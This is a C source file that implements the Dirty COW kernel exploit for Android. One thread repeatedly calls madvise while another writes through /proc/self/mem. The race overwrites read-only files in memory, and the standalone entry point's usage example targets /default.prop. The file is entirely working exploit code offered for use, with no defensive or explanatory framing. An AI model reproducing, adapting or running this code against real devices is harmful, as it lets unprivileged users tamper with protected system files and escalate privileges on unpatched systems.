#include <err.h>
#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

typedef struct {
    void* map;
    char* buffer;
    unsigned int start;
    off_t size;
    char cont;
    int selfMem;
} CowData;


void* madviseThread(void* arg)
{
    CowData* cowData = (CowData*) arg;
    unsigned int pagesize = getpagesize();
    uintptr_t startPos = (uintptr_t)cowData->map + (uintptr_t) cowData->start;
    int c = 0;
    int extrasize = (startPos % pagesize);
    startPos = startPos - extrasize;

    while(cowData->cont)
        c += madvise((void*) startPos, extrasize + cowData->size, MADV_DONTNEED);
    return NULL;
}

void* procselfmemThread(void* arg)
{
    CowData* cowData = (CowData*) arg;
    uintptr_t startPos = ((uintptr_t) cowData->map )+ ((uintptr_t) cowData->start);

    int c = 0;
    while (cowData->cont) {
        lseek(cowData->selfMem,startPos, SEEK_SET);
        c += write(cowData->selfMem, cowData->buffer, cowData->size);
    }
    return NULL;
}

unsigned int copyErrors(CowData* cowData)
{
    int i = 0;
    unsigned int errors = 0;
    unsigned int A,B,C;
    char * var = (char*) malloc(cowData->size);
    uintptr_t startPos = ((uintptr_t) cowData->map )+ ((uintptr_t) cowData->start);

    lseek(cowData->selfMem,startPos,SEEK_SET);
    read(cowData->selfMem,var,cowData->size);
    char * mapMem = (char*) startPos;

    for(i = 0; i < cowData->size;i++)
    {
        A = (unsigned char)var[i];
        B = (unsigned char)cowData->buffer[i];
        C= (unsigned char) mapMem[i];
        if(A!= B || B != C)
            errors++;
    }

    return errors;
}

unsigned int runCowIteration(CowData* cowData, unsigned int millisecs)
{
    pthread_t pth1, pth2;
    unsigned int errors =0;
    cowData->cont = 1;
    pthread_create(&pth1, NULL, madviseThread, cowData);
    pthread_create(&pth2, NULL, procselfmemThread, cowData);
    usleep(millisecs*1000);
    cowData->cont = 0;
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    errors = copyErrors(cowData);
    return errors;
}

unsigned int loadSourceFile(const char* filename, CowData* cowData)
{
    struct stat st;
    off_t readsize = 0;
    int f = open(filename, O_RDONLY);
    if (f < 0)
        return 0;
    fstat(f, &st);
    // Allocate the full length of the target file to ensure crash
    // when overwriting in-memory files
    readsize = st.st_size > cowData->size ? cowData->size : st.st_size;
    void* buf = malloc(cowData->size);
    memset(buf, 0, cowData->size);
    int letti = read(f, buf, readsize);
    close(f);

    if (letti <= 0)
        return 0;

    cowData->buffer = buf;
    return letti;
}

unsigned int loadSourceData(const char* data, size_t length, CowData* cowData)
{
    struct stat st;
    off_t readsize = 0;
    // Allocate the full length of the target file to ensure crash
    // when overwriting in-memory files
    readsize = length > cowData->size ? cowData->size : length;
    void* buf = malloc(cowData->size);
    memset(buf, 0, cowData->size);
    memcpy(buf, data, length);

    cowData->buffer = buf;
    return length;
}

unsigned int loadDestinationFile(const char * fileName,CowData* cowData)
{
    struct stat st;
    void* map;

    int f = open(fileName, O_RDONLY);
    if(f < 0)
        return 0;
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if(MAP_FAILED == map)
    {
        close(f);
        return 0;
    }
    cowData->size = st.st_size;
    cowData->map = map;
    return cowData->size;
}

int prepareCowData(CowData* cowData)
{
    cowData->size = 0;
    cowData->buffer = NULL;
    cowData->map = NULL;
    cowData->start = 0;
    cowData->selfMem = -1;
    int f = open ("/proc/self/mem", O_RDWR);
    if(f < 0)
        return f;
    cowData->selfMem = f;
    return f;
}

unsigned int runCow(CowData* cow)
{
    unsigned int milliseconds = 200;
    unsigned int chunk_size = 512*2*100;
    unsigned int maxIterations = 5;

    unsigned int start = cow->start;
    unsigned int remaining = cow->size;
    char * originalBuffer = cow->buffer;
    unsigned int originalStart = cow->start;
    unsigned int originalSize = cow->size;

    unsigned int errors;
    unsigned int current_chunk;
    unsigned int i;

    while(remaining > 0)
    {
            current_chunk = chunk_size;
            if(current_chunk > remaining)
                current_chunk = remaining;
            cow->start = start;
            cow->size = current_chunk;
            errors = 0;
            LOGV("Attempting to dirtycow");
            if(copyErrors(cow) != 0)
            {
                for(i = 0; i<maxIterations; i++)
                {
                    errors = runCowIteration(cow,milliseconds);
                    if(errors == 0)
                        break;
                }
            }

            if(errors > 0)
                return 0;
            start += cow->size;
            remaining -= cow->size;
            cow->buffer += cow->size;
    }
    LOGV("Done dirtycowing");

    cow->buffer = originalBuffer ;
    cow->start = originalStart;
    cow->size = originalSize ;

    if(errors > 0)
        return 0;
    else
        return 1;
}

int overwrite_file(const char *target, const char *source, size_t length)
{
    CowData cow;

    if(prepareCowData(&cow) < 0)
    {
        LOGV("Error preparing dirtycow data");
        return 1;
    }

    if(loadDestinationFile(target,&cow) == 0)
    {
        LOGV("Error loading destination file :%s", strerror(errno));
        return 1;
    }

    if(length > 0)
    {
        if(loadSourceData(source, length, &cow) == 0)
        {
            LOGV("Error loading source data\n");
            return 1;
        }
    } else
    {
        if(loadSourceFile(source,&cow) == 0)
        {
            LOGV("Error loading source file: %s", strerror(errno));
            return 1;
        }
    }

    if(runCow(&cow) == 0)
    {
        LOGV("dirtycow failed");
        return 1;
    }

    return 0;
}

#ifdef STANDALONE
int main(int argc, char *argv[])
{
	if (argc < 3) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return 0;
	}
    return overwrite_file(argv[1], argv[2], 0);
}
#endif

